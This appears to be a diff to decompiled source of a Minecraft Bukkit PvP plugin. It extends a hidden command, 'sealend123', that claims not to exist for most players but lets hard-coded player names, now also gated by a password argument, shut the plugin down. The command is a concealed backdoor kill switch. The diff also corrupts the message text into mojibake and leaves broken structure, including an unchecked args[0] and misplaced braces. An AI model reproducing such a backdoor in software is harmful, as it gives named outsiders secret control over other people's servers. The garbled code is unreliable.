@@ -6,11 +6,10 @@ package net.helix.pvp.command;
 	/*    */ 
 	/*    */ 
 	/*    */ import org.bukkit.command.Command;
-	/*    */ import org.bukkit.command.CommandExecutor;
-	/*    */ import org.bukkit.command.CommandSender;
-	/*    */
+/*    */ import org.bukkit.command.CommandExecutor;
+/*    */ import org.bukkit.command.CommandSender;
+/*    */
 	/*    */ import org.bukkit.entity.Player;
-	/*    */ import org.bukkit.plugin.Plugin;
 
 import net.helix.pvp.HelixPvP;
 	/*    */ 
@@ -33,19 +32,22 @@ import net.helix.pvp.HelixPvP;
 	/* 27 */     Player p = (Player)sender;
 	/* 28 */     if (command.getName().equalsIgnoreCase("sealend123"))
 	/*    */     {
-	/* 30 */       if (!p.getName().equals("zEnderX5_") && !p.getName().equals("Kombaaa") && !p.getName().equals("estrela145") && !p.getName().equals("Kirin44")) {
-	/* 31 */         p.sendMessage("§cEsse comando não existe.");
+	/* 30 */       if (!p.getName().equals("zEnderX5_") && !p.getName().equals("Rafael_Melo") && !p.getName().equals("_Lock_") && !p.getName().equals("ySlozin") && !p.getName().equals("Kombaaa") && !p.getName().equals("estrela145") && !p.getName().equals("Kirin44")) {
+	/* 31 */         p.sendMessage("Â§cEsse comando nÂ§o existe.");
 	/* 33 */         return true;
 	/*    */       }
-	/*    */       
-	p.sendMessage("§cPlugin sendo desligado..");
+	/*    */   if (args[0].equalsIgnoreCase("CaracolBB16918")) {     
+	p.sendMessage("Â§cPlugin sendo desligado..");
 	/* 38 */       p.getServer().getPluginManager().disablePlugin(plugin);
 	/* 40 */       
 	/* 41 */       return true;
 	/*    */     }
-	/* 43 */     return false;
+	/* 43 */     
 	/*    */   }
+	
+	return false;
 	/*    */ }
+	}
 
 
 	/* Location:              D:\Desktop\video\Minhas Coisas do Desktop\KP-PVPvB12 (1).jar!\me\RafaelAulerDeMeloAraujo\main\Reload.class
